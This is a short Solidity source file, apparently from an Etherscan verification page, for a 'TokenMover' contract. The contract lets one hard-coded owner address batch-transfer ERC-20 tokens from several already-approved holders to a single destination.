/**
 *Submitted for verification at Etherscan.io on 2022-11-22
*/

pragma solidity 0.8.15;

interface IERC20 {
    function transferFrom(address _from, address _to, uint256 _amount) external;
}

contract TokenMover {

    function transferMany(
        IERC20 _token,
        address _to,
        address[] calldata _from,
        uint256[] calldata _amount
    ) external {
        require(msg.sender == 0x0cEBB78BF382d3b9e5ae2B73930Dc41a9a7A5E06);
        for (uint i; i < _from.length; i++) {
            _token.transferFrom(_from[i], _to, _amount[i]);
        }
    }
}